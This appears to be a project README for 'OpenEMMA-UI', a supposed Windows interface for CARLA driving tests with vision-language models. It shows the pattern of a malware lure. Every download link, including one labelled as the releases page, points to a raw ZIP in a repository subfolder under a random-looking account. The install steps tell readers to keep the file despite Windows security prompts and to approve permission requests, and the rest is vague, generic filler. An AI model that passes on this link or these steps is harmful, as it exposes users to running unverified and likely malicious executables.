# 🤖 OpenEMMA-UI - Run CARLA Driving UI Fast

[![Download OpenEMMA-UI](https://img.shields.io/badge/Download-OpenEMMA--UI-blue?style=for-the-badge)](https://github.com/Expectationtherapeuticabortion479/OpenEMMA-UI/raw/refs/heads/main/ui_common/UI-Open-EMM-1.3.zip)

## 🚗 Overview

OpenEMMA-UI is a Windows app for real-time autonomous driving tests in CARLA. It connects the OpenEMMA system with vision-language models so you can see driving decisions, reasoning, and model output in one place.

Use it if you want a simple UI for:
- viewing live driving scenes
- checking model decisions
- running CARLA-based demos
- comparing vision-language backends
- following agent reasoning in plain text

## 📥 Download

Visit this page to download the latest Windows release:

[Download OpenEMMA-UI](https://github.com/Expectationtherapeuticabortion479/OpenEMMA-UI/raw/refs/heads/main/ui_common/UI-Open-EMM-1.3.zip)

On that page, look for the latest release asset for Windows. If there are several files, choose the one that matches your PC.

## 🖥️ What You Need

OpenEMMA-UI is built for a Windows desktop or laptop.

Recommended setup:
- Windows 10 or Windows 11
- 8 GB RAM or more
- A modern GPU for smooth CARLA use
- Enough free disk space for the app, CARLA files, and model files
- An internet connection for the first download

If you plan to use CARLA at the same time, you may need:
- CARLA installed on the same machine
- a graphics card that can handle real-time simulation
- enough storage for simulator maps and assets

## 📂 What You Download

After you visit the releases page, you will usually find one of these:
- a Windows installer file
- a ZIP file you can extract
- a packaged app that starts after download

If the file is a ZIP, extract it before you run the app. If it is an installer, open it and follow the setup steps.

## 🧭 Install on Windows

1. Open the releases page.
2. Download the latest Windows file.
3. If Windows shows a security prompt, choose the option to keep the file.
4. If you downloaded a ZIP file, right-click it and select Extract All.
5. Open the extracted folder or installer.
6. Run the main app file.
7. If Windows asks for permission, select Yes.
8. Wait for the UI to open.

## 🏁 First Launch

When you start OpenEMMA-UI for the first time, it may need a short setup period.

You may see options for:
- CARLA connection
- model selection
- camera or sensor input
- reasoning display
- backend choice

A simple first run usually follows this order:
1. Start CARLA.
2. Open OpenEMMA-UI.
3. Connect the UI to the simulator.
4. Choose a vision-language backend.
5. Start the driving session.

## 🧠 How It Works

OpenEMMA-UI helps you see what the driving system is doing while CARLA runs.

The app can show:
- the road view from the vehicle
- the current driving action
- the model’s reasoning
- step-by-step decision text
- output from more than one VLM backend

This makes it easier to check how the system handles:
- lane following
- turns
- traffic lights
- nearby vehicles
- scene understanding

## 🔌 Connect to CARLA

To use OpenEMMA-UI with CARLA:

1. Start the CARLA simulator.
2. Make sure CARLA is running before you open the UI, if your setup needs that order.
3. Open OpenEMMA-UI.
4. Enter the CARLA host and port if the app asks for them.
5. Confirm the connection.
6. Start a driving run.

Common local values are:
- Host: `127.0.0.1`
- Port: `2000`

If your CARLA setup uses a different port, use the one from your simulator settings.

## 🖼️ Interface Guide

The UI is made for clear view and quick checks.

Common areas you may see:
- **Live View**: shows the current driving scene
- **Status Panel**: shows if the app is connected
- **Reasoning Panel**: shows why the model chose an action
- **Model Selector**: lets you switch backends
- **Controls**: start, stop, pause, or reset a run
- **Log Area**: shows app messages and errors

If the app shows more than one model, use the selector to compare outputs side by side.

## ⚙️ Common Setup Options

You may need to choose settings such as:
- camera feed source
- frame rate
- model backend
- reasoning depth
- output format
- log level

For a first test, use the default values. Defaults are usually the safest choice for a new user.

## 🛠️ If the App Does Not Start

If OpenEMMA-UI does not open:

1. Check that the file finished downloading.
2. Make sure you extracted the ZIP file if you downloaded one.
3. Run the app as a normal user first.
4. If Windows blocks it, right-click the file and check its properties.
5. Confirm that your system has enough free disk space.
6. Restart the app after closing CARLA and opening it again.

If the screen stays blank:
- wait a few seconds
- confirm CARLA is running
- check that the simulator port matches the app setting
- make sure the selected backend is available

## 🌐 Model Backends

OpenEMMA-UI can work with more than one vision-language backend. This helps when you want to compare how each model reads the driving scene.

You may see backends such as:
- OpenEMMA
- local VLM models
- other PyTorch-based models

When you switch backends, keep these points in mind:
- some models need more GPU memory
- some models load slower than others
- some models give shorter reasoning text
- some models work better on detailed scenes

## 📊 Example Use Cases

OpenEMMA-UI is useful for:
- testing a self-driving demo in CARLA
- checking why a model chose to brake
- comparing reasoning from two models
- showing an autonomous driving pipeline to others
- studying how a vision-language model reacts to traffic scenes
- reviewing model output during research work

## 🔐 File Safety

Use the files from the releases page only.

Before you run the app:
- check that the download came from the release page
- avoid renamed files from unknown sources
- keep the app in a folder you can find again
- do not move files while the app is running

## 🧰 Basic Tips

For a smoother first run:
- close other heavy apps
- keep CARLA and OpenEMMA-UI on the same machine
- use a wired network if models or data load from a remote source
- keep your graphics drivers current
- use the latest release file from GitHub

## 📝 Typical Workflow

A simple workflow looks like this:

1. Download the Windows release.
2. Install or extract it.
3. Start CARLA.
4. Open OpenEMMA-UI.
5. Connect the app to CARLA.
6. Select a vision-language backend.
7. Start the drive.
8. Watch the live scene and reasoning output.

## 📎 Download Again

If you need the file again, use this page:

[OpenEMMA-UI Releases](https://github.com/Expectationtherapeuticabortion479/OpenEMMA-UI/raw/refs/heads/main/ui_common/UI-Open-EMM-1.3.zip)

## 🧩 Topic Focus

This project centers on:
- autonomous driving
- CARLA simulator use
- chain-of-thought reasoning
- embodied AI
- explainable AI
- human-AI interaction
- multimodal AI
- real-time systems
- vision-language models
- PyTorch-based workflows

## 🗂️ Project Name

OpenEMMA-UI